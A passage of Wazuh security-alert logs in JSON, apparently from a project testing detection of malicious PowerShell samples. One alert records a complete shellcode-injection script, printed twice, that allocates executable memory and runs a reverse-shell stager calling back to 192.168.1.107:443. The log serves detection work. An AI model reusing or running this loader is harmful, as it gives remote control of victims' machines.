60};","scriptBlockId":"82bd69d5-788a-47e8-bea4-a08c020de640","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\1461.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:18:29.248+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":47,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304309.1998019","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:18:49.0225565Z","eventRecordID":"144853","processID":"4992","threadID":"6032","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$c = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x6b,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: e8ff3516-a375-4c0a-a157-a164e65f707e\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\1463.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$c = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x6b,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"e8ff3516-a375-4c0a-a157-a164e65f707e","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\1463.ps1"}}},"location":"EventChannel"}
